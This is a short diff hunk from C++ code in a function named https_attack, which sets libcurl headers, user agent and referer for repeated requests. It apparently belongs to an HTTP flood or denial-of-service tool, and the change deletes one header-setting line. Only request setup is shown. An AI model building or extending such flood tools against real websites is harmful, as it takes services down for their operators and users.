@@ -70,7 +70,6 @@ void https_attack(const string& url, const string& method, int id, int interval,
             curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
             curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());
-            curl_easy_setopt(curl, CURLOPT_ACCEPT, accept_header.c_str());
             curl_easy_setopt(curl, CURLOPT_REFERER, referer_header.c_str());
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
             curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
